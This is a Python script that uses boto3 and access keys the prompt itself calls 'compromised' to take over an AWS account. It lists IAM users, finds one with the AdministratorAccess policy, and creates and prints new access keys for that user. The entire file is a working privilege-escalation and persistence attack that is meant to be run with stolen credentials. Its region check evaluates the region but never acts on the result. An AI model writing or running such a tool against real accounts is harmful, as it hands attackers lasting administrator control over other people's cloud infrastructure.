import json
from boto3.session import Session

def connect_to_aws():
    global iam_client

    access_key = input("Copy and paste the compromised AWS access key ID here: ")
    secret_key = input("Copy and paste the compromised AWS secret access key here: ")
    region = input("Enter a region here: ")

    while True:
        try:
            aws_regions = [
                'ap-east-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-south-1', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 
                'cn-north-1', 'cn-northwest-1', 'eu-central-1', 'eu-north-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 
                'sa-east-1', 'us-east-1', 'us-east-2', 'us-gov-east-1', 'us-gov-west-1', 'us-west-1', 'us-west-2'
            ]
            region in aws_regions
            break
        except ValueError:
            print("Enter a valid AWS region.")

    session = Session(
        aws_access_key_id='{}'.format(access_key),
        aws_secret_access_key='{}'.format(secret_key),
        region_name='{}'.format(region)
    )

    # Connect to the AWS IAM service.
    iam_client = session.client('iam')

def get_user_with_admin_access():
    global get_iam_user, chosen_user

    get_iam_user = iam_client.list_users()
    user_list = []

    # Put the IAM users in the 'user_list' list.
    for i in range(len(get_iam_user['Users'])):
        user_list.append(get_iam_user['Users'][i]['UserName'])

    # Find the user in the 'user_list' list that has the
    # 'Administrator Access' policy attached to it.    
    for i in range(len(user_list)):
        user_policies = iam_client.list_attached_user_policies(UserName='{}'.format(user_list[i]))['AttachedPolicies']

        for j in range(len(user_policies)):
            if user_policies[j]['PolicyName'] == 'AdministratorAccess':
                chosen_user = user_list[i]

def escalate_privilege():
    global iam_access_key

    iam_access_key = iam_client.create_access_key(
        UserName = '{}'.format(chosen_user)
    )

def view_metadata():
    print("{}'s new access keys".format(chosen_user))
    print(json.dumps(
            iam_access_key['AccessKey'],
            indent = 1,
            default = str
        )
    )

if __name__ == "__main__":
    connect_to_aws()
    get_user_with_admin_access()
    escalate_privilege()
    view_metadata()
